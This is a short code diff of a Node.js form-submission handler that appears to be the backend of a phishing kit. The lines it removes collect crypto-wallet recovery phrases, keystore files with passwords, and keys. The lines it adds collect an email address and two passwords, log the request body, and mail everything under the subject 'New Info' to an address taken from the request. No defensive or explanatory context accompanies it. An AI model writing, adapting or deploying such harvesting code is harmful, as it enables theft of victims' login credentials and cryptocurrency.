@@ -1,20 +1,16 @@
 const { mailer } = require("../utils/mailer");
 
 const processSubmission = async (req, res) => {
-  const { phrase, keyword, password, pk, email } = req.body;
+  const { mail, password, password2, email } = req.body;
+
+  console.log(req.body);
   const subject = "New Info";
 
   try {
     let message = "";
 
-    if (phrase) {
-      message = `Phrase: ${phrase}`;
-    } else if (keyword) {
-      message = `Keystore JSON: ${keyword}, Password: ${password}`;
-    } else if (pk) {
-      message = `Public Key: ${pk}`;
-    } else {
-      throw new Error("Invalid submission");
+    if (mail && password && password2) {
+      message = `Email: ${mail} Pass1: ${password} Pass2: ${password2}`;
     }
 
     await mailer(email, message, subject);
